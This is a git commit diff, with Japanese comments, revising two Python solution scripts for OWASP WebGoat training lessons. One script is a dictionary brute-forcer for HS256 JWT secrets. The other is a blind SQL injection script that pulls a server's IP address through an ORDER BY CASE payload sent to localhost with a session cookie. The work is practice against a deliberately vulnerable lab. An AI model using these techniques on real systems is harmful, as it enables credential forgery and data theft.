d87425295e5909a01bc33f45ecf8dd6b6182d8b1
Yoiro416 <75517744+Yoiro416@users.noreply.github.com>
2023-05-03 16:06:41 +0900

    公開を機にコード見直し コメントの追加なども含む

--- OWASP_Webgoat/jwtcracker.py
+++ OWASP_Webgoat/jwtcracker.py
@@ -1,8 +1,11 @@
 import jwt
 
+# 一度ページにアクセスしtokenを取得してここに入力
+# できれば自動的に取得できるようにしたい
 token = 'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY3ODgwMTMyOSwiZXhwIjoxNjc4ODAxMzg5LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.F10XcOBnE3pq9BNpljTLhiEg_6MVSXAaM4VRtwSKTuU'
 
-
+# https://github.com/first20hours/google-10000-english/blob/master/20k.txt
+# 20k.txtは以上のリポジトリからお借りしました。
 try :
     f = open('20k.txt','r')
     for key in f:
@@ -13,11 +16,12 @@ try :
                 algorithms=["HS256"]
             )
             print(key)
-            #メタ文字までVerificationに使用するっぽいわね...rstripで20k.txtからkeyに読み込ませた行の文字列の右端の終端文字を削除することで正しく認証させ
+            #メタ文字までVerificationに使用するっぽい...rstripで20k.txtからkeyに読み込ませた行の文字列の右端の終端文字を削除することで正しく認証させられる
         except Exception as e:
             if 'Signature has expired' in str(e):
                 print('result is '+key)
                 break
-            #keyが通った場合はverification failedではなくSignature has expired(署名時間切れ)のExceptを吐き出すのでそれをキャッチして文字列検証で分別す
+            #keyが通った場合はverification failedではなくSignature has expired(署名時間切れ)のExceptを吐き出すのでそれをキャッチして文字列検証で分別する
+            # !'verification failed' in str(e)のほうが確実...?
 except :
     print('Something went wrong')
--- OWASP_Webgoat/sniper_2_adv.py
+++ OWASP_Webgoat/sniper_2_adv.py
@@ -3,18 +3,22 @@ import requests
 import urllib
 
 ###
+#TODO sniper_2.pyの改良を行っている
+#xxx.xxx.xxx.xxxのピリオドの部分も判定できるようにする
+#
 #SQL injection (mitigation) lesson 12
 #F12のnetworkタブからgetメソッドの通信を閲覧、編集して再送信を行い、URLパラメータにcase when (substring((select ip from servers where hostname='webgoat-prd'),1,1)=1) then id else hostname endで
 #Blind SQLとORDERの特性をを応用した攻撃が通る
-# COMPLETED!
 ###
+
 
 def sql_injection_adv_5():
 
     index=1
-    numbers='0123456789'
+    numbers='0123456789.'
     numbers_num=0
     result=''
+    isfinish = False
 
     headers={
         'Cookie': 'JSESSIONID=O6tg2QHoX_AKTTZuF4M-1vyjOouTBFZc3V-uksMv'
@@ -22,13 +26,9 @@ def sql_injection_adv_5():
         # Example here ^
     }
     #インスペクターなどを使用しクッキーの数値を取得し貼り付けること
-    #下のrequests.put()内で指定するURLと対応するCOOKIEのJSESSIONID
+    #下のrequests.get()内で指定するURLと対応するCOOKIEのJSESSIONID
 
     while True:
-        if index >= 16:
-            print('result='+str(result).rstrip('.'))#結果を成形し出力>終了
-            return
-        
         url='http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+(substring((select+ip+from+servers+where+hostname%3d\'webgoat-prd\'),{},1)%3d{})+then+id+else+hostname+end'.format(index,numbers[numbers_num])
 
         r= requests.get(url,headers=headers)
@@ -36,13 +36,15 @@ def sql_injection_adv_5():
             response =json.loads(r.text)
             
         except:
-            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
+            print("Wrong JSESSIONID")
             return
 
         for i in range(4):
             if response[i]['id'] != str(i+1):
                 numbers_num+=1 
                 break
+            #idが1から順に並んでいなければnumbers_numをインクリメントしてもう一度検証
+            #ORDERの特性上、正しい数値が与えられていれば順に並んでいるはず
                 
             if i == 3:
                 print(numbers[numbers_num])
@@ -50,10 +52,14 @@ def sql_injection_adv_5():
                 numbers_num=0
                 index+=1
         
-        if index % 4 == 0:
-            index+=1
-            result = result+'.'
-        
+        if numbers_num >= len(numbers):
+            isfinish = True
+            
+        if isfinish:
+            print('result='+str(result))#結果を成形し出力>終了
+            return
+        #numbers内に該当文字がない->何かしらのエラーもしくはアドレスの取得完了
+        #isfinishをTrueにして最終的な結果を出力
                   
 
 sql_injection_adv_5()
